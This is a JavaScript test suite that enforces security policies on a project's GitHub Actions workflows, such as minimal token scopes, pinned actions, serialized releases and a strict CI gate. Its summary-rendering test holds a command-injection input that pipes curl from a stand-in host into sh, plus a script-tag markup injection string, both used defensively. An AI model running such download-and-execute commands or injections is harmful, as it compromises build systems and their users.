import assert from "node:assert/strict"
import { spawnSync } from "node:child_process"
import { existsSync, mkdtempSync, readdirSync, readFileSync, realpathSync, rmSync } from "node:fs"
import { tmpdir } from "node:os"
import { join } from "node:path"
import { fileURLToPath } from "node:url"
import test from "node:test"
import { parse } from "yaml"
import { renderSummary } from "../../../.github/actions/summary/summary.mjs"

const repository = fileURLToPath(new URL("../../../", import.meta.url))
const read = (path) => parse(readFileSync(join(repository, path), "utf8"))
const workflows = Object.fromEntries(
    readdirSync(join(repository, ".github/workflows"))
        .filter((name) => name.endsWith(".yml"))
        .map((name) => [name, read(`.github/workflows/${name}`)]),
)
const actions = Object.fromEntries(
    readdirSync(join(repository, ".github/actions")).map((name) => [name, read(`.github/actions/${name}/action.yml`)]),
)

// The only jobs allowed to hold write scopes, and exactly which scopes they hold
const writers = {
    "ci.yml/release-trigger": { actions: "write" },
    "release-version.yml/pull_request": { contents: "write", "pull-requests": "write", actions: "write" },
    "release-publish.yml/publish": { "id-token": "write" },
}

// A static group queues every run behind the previous one, and a queued run is never cancelled
function assertSerialized(concurrency, where) {
    assert.equal(typeof concurrency?.group, "string", where)
    assert.notEqual(concurrency.group.trim(), "", where)
    assert.doesNotMatch(concurrency.group, /\$\{\{/, `${where} must share one group across runs`)
    assert.equal(concurrency["cancel-in-progress"], false, where)
    assert.equal(concurrency.queue, "max", where)
}

const userGitBash = join(process.env.LOCALAPPDATA ?? "", "Programs/Git/bin/bash.exe")
const bash = process.platform === "win32" && existsSync(userGitBash) ? userGitBash : "bash"

function* jobs() {
    for (const [file, workflow] of Object.entries(workflows))
        for (const [id, job] of Object.entries(workflow.jobs)) yield { file, workflow, id, job }
}

function* steps() {
    for (const { file, id, job } of jobs()) for (const step of job.steps ?? []) yield { where: `${file}/${id}`, step }
    for (const [name, action] of Object.entries(actions))
        for (const step of action.runs.steps ?? []) yield { where: `actions/${name}`, step }
}

test("Workflows default to read-only tokens and grant writes only to the reviewed jobs", () => {
    for (const [file, workflow] of Object.entries(workflows)) {
        assert.ok(workflow.permissions, `${file} must declare top-level permissions`)
        for (const [scope, level] of Object.entries(workflow.permissions))
            assert.equal(level, "read", `${file} grants ${scope}: ${level} to every job`)
    }
    for (const { file, id, job } of jobs()) {
        const granted = Object.fromEntries(
            Object.entries(job.permissions ?? {}).filter(([, level]) => level === "write"),
        )
        assert.deepEqual(granted, writers[`${file}/${id}`] ?? {}, `${file}/${id} write permissions`)
    }
})

test("OIDC publication is confined to the protected environment after inspection", () => {
    const publish = workflows["release-publish.yml"].jobs.publish
    assert.equal(publish.environment, "package")
    assert.equal(publish.needs, "inspect")
    assertSerialized(publish.concurrency, "release-publish.yml/publish")
    const setup = publish.steps.find((step) => step.id === "setup")
    assert.equal(setup.with.install, "false", "The publisher must not install the workspace")
})

test("Release tooling runs from the workflow commit and the release App token stays in one step", () => {
    const publish = workflows["release-publish.yml"]
    for (const [id, job] of Object.entries(publish.jobs))
        for (const step of job.steps ?? [])
            if (String(step.uses).startsWith("actions/checkout@"))
                assert.equal(step.with?.ref, undefined, `release-publish.yml/${id} must check out the workflow commit`)
    const source = readFileSync(join(repository, ".github/workflows/release-publish.yml"), "utf8")
    assert.equal(source.match(/secrets\.RELEASE_APP_PRIVATE_KEY/g)?.length, 1)
    assert.equal(source.match(/steps\.release_token\.outputs\.token/g)?.length, 1)
    const reconcile = publish.jobs.reconcile
    const ids = reconcile.steps.map((step) => step.id)
    const token = reconcile.steps.find((step) => step.id === "release_token")
    assert.match(token.uses, /^actions\/create-github-app-token@[a-f0-9]{40}$/)
    assert.equal(token.with["permission-contents"], "write")
    assert.equal(Object.keys(token.with).filter((key) => key.startsWith("permission-")).length, 1)
    assert.equal(token.with["skip-token-revoke"], undefined)
    assert.ok(ids.indexOf("verify") < ids.indexOf("release_token"), "npm bytes are verified before the token exists")
    const announce = reconcile.steps.find((step) => step.id === "announce")
    assert.equal(announce.env.GH_TOKEN, "${{ steps.release_token.outputs.token }}")
    assert.equal(reconcile.environment, "package")
    assert.deepEqual(reconcile.needs, ["inspect", "publish", "smoke"])
})

test("Every external action and container is pinned to an immutable digest", () => {
    for (const { where, step } of steps()) {
        if (!step.uses) continue
        if (step.uses.startsWith("$/")) continue
        if (step.uses.startsWith("docker://")) assert.match(step.uses, /@sha256:[a-f0-9]{64}$/, where)
        else assert.match(step.uses, /^[\w.-]+\/[\w./-]+@[a-f0-9]{40}$/, `${where}: ${step.uses}`)
    }
    for (const { file, id, job } of jobs())
        if (job.uses) assert.match(job.uses, /^\$\//, `${file}/${id} calls only same-repository workflows`)
})

test("Checkouts drop credentials, scripts avoid expression interpolation and risky triggers are absent", () => {
    for (const { where, step } of steps()) {
        if (String(step.uses).startsWith("actions/checkout@"))
            assert.equal(step.with?.["persist-credentials"], false, `${where} must not persist checkout credentials`)
        if (step.run) assert.doesNotMatch(step.run, /\$\{\{/, `${where} must pass values through env`)
    }
    for (const [file, workflow] of Object.entries(workflows)) {
        for (const trigger of ["pull_request_target", "workflow_run"])
            assert.equal(workflow.on[trigger], undefined, `${file} must not use ${trigger}`)
        for (const [id, job] of Object.entries(workflow.jobs))
            if (`${file}/${id}` !== "release-publish.yml/docs-preview")
                assert.notEqual(job.secrets, "inherit", `${file}/${id} inherits secrets`)
    }
    // A called workflow receives no website environment secret unless its caller inherits secrets
    assert.equal(workflows["release-publish.yml"].jobs["docs-preview"].secrets, "inherit")
})

test("Release and Preview work is serialized with read-only caches and never cancelled mid-run", () => {
    for (const file of ["release-prepare.yml", "release-version.yml", "release-publish.yml", "docs-preview.yml"])
        assert.equal(workflows[file]["cache-mode"], "read", `${file} cache access`)
    for (const file of ["release-prepare.yml", "release-version.yml", "docs-preview.yml"])
        assert.equal(workflows[file].concurrency["cancel-in-progress"], false, file)
    assertSerialized(workflows["release-publish.yml"].jobs.reconcile.concurrency, "release-publish.yml/reconcile")
    // Manual CI dispatches are never cancelled by a later run
    assert.match(workflows["ci.yml"].concurrency["cancel-in-progress"], /github\.event_name\s*!=\s*'workflow_dispatch'/)
})

test("The required CI gate needs every job and rejects failed, cancelled, skipped and missing results", () => {
    const check = workflows["ci.yml"].jobs.check
    const gated = Object.keys(workflows["ci.yml"].jobs).filter((id) => !["check", "release-trigger"].includes(id))
    assert.deepEqual([...check.needs].sort(), gated.sort())
    assert.equal(check.if, "always()")
    const groups = Object.keys(check.steps[0].env).filter((key) => key.endsWith("_RESULT") && key !== "REUSE_RESULT")
    assert.equal(groups.length, gated.length - 1, "Every check job result reaches the gate")
    // Check jobs skip only for a reused result, and a failed lookup still runs them
    for (const id of gated.filter((id) => id !== "reuse")) {
        const job = workflows["ci.yml"].jobs[id]
        assert.equal(job.needs, "reuse", id)
        assert.match(job.if, /^\$\{\{ !cancelled\(\) && needs\.reuse\.outputs\.reused != 'true' \}\}$/, id)
    }
    // Those skipped jobs make the implicit success() condition false, so the release trigger reads check's own result
    assert.match(workflows["ci.yml"].jobs["release-trigger"].if, /^\$\{\{ !cancelled\(\) && needs\.check\.result == 'success' && /)
    const passed = { ...Object.fromEntries(groups.map((key) => [key, "success"])), REUSE_RESULT: "success", REUSED_RUN_URL: "" }
    const skipped = Object.fromEntries(groups.map((key) => [key, "skipped"]))
    const reused = { REUSE_RESULT: "success", REUSED_RUN_URL: "https://github.com/owner/repo/actions/runs/1" }
    // [results, expected exit status]
    const cases = [
        [passed, 0],
        // A failed reuse lookup is harmless once the full check jobs passed
        [{ ...passed, REUSE_RESULT: "failure" }, 0],
        [{ ...skipped, ...reused }, 0],
        [{ ...skipped, ...reused, REUSE_RESULT: "failure" }, 1],
        [{ ...skipped, REUSE_RESULT: "success", REUSED_RUN_URL: "" }, 1],
    ]
    for (const key of groups)
        for (const result of ["failure", "cancelled", "skipped", ""]) cases.push([{ ...passed, [key]: result }, 1])
    const root = realpathSync(tmpdir())
    const directory = mkdtempSync(join(root, "fluxerly-gate-"))
    try {
        for (const [index, [results, expected]] of cases.entries()) {
            const summary = join(directory, `gate-${index}.md`)
            const result = spawnSync(bash, ["--noprofile", "--norc", "-e", "-o", "pipefail", "-c", check.steps[0].run], {
                cwd: directory,
                encoding: "utf8",
                timeout: 10_000,
                windowsHide: true,
                env: { ...process.env, ...results, GITHUB_STEP_SUMMARY: summary },
            })
            assert.ifError(result.error)
            assert.equal(result.status, expected, `case ${index}: ${result.stderr}`)
        }
    } finally {
        rmSync(directory, { recursive: true, force: true })
    }
})

test("SDK consumers run on the Node floor declared by the SDK manifest", () => {
    const consumers = workflows["ci.yml"].jobs.consumers
    assert.ok(consumers.strategy.matrix.include.some((entry) => entry["runtime-policy"] === "consumer-floor"))
    const setupStep = consumers.steps.find((step) => step.uses === "$/.github/actions/setup")
    assert.equal(setupStep.with["runtime-policy"], "${{ matrix.runtime-policy }}")
    const policy = actions.setup.runs.steps.find((step) => step.id === "node")
    const directory = mkdtempSync(join(realpathSync(tmpdir()), "fluxerly-node-policy-"))
    try {
        const output = join(directory, "output.txt")
        const result = spawnSync(bash, ["--noprofile", "--norc", "-e", "-o", "pipefail", "-c", policy.run], {
            cwd: repository,
            encoding: "utf8",
            timeout: 10_000,
            windowsHide: true,
            env: { ...process.env, RUNTIME_POLICY: "consumer-floor", GITHUB_OUTPUT: output },
        })
        assert.ifError(result.error)
        assert.equal(result.status, 0, result.stderr)
        const selected = /^version=(.+)$/m.exec(readFileSync(output, "utf8"))?.[1]
        const sdk = JSON.parse(readFileSync(join(repository, "projects/sdk/package.json"), "utf8"))
        assert.equal(sdk.engines.node, `>=${selected}`)
    } finally {
        rmSync(directory, { recursive: true, force: true })
    }
})

test("Job summaries escape untrusted values and never present failures or commands as success", () => {
    const summary = renderSummary({
        title: "Version",
        steps: { version: { outcome: "success", outputs: { token: "test-private-sentinel" } } },
        details: { Version: "<script>bad</script>\n| injected | `code` [link](https://example.invalid)" },
        command: "gh workflow run release-publish.yml -f candidate_checksum=abc",
    })
    assert.doesNotMatch(summary, /<script>|\n\| injected|`code`|\[link\]|test-private-sentinel/)
    assert.match(summary, /```sh\ngh workflow run release-publish\.yml -f candidate_checksum=abc\n```/)
    // The status line directly follows the title, and step outcomes otherwise appear only as table rows
    const status = (rendered) => rendered.split("\n").slice(1).find((line) => line.trim() !== "")
    const guidance = (rendered, step) => rendered.split("\n").filter((line) => !line.startsWith("|") && line.includes(step))
    const input = (outcome) => ({
        title: "Version",
        steps: { setup: { outcome: "success" }, compile: { outcome }, pull: { outcome: "skipped" } },
        next: "Merge the PR",
        command: "gh workflow run release-publish.yml",
    })
    const succeeded = renderSummary({ ...input("success"), steps: { setup: { outcome: "success" }, compile: { outcome: "success" } } })
    assert.match(succeeded, /Merge the PR/)
    assert.match(succeeded, /gh workflow run release-publish\.yml/)
    assert.deepEqual(guidance(succeeded, "compile"), [])
    for (const outcome of ["failure", "cancelled"]) {
        const failed = renderSummary(input(outcome))
        assert.notEqual(status(failed), status(succeeded), outcome)
        assert.notEqual(status(failed), status(renderSummary(input("success"))), `${outcome} is not a skip`)
        assert.notDeepEqual(guidance(failed, "compile"), [], `${outcome} guidance names the failed step`)
        assert.doesNotMatch(failed, /Merge the PR|gh workflow run/, outcome)
    }
    const unsafe = renderSummary({ title: "Prepare", steps: {}, command: "gh run; curl https://example.invalid | sh" })
    assert.doesNotMatch(unsafe, /curl/)
})
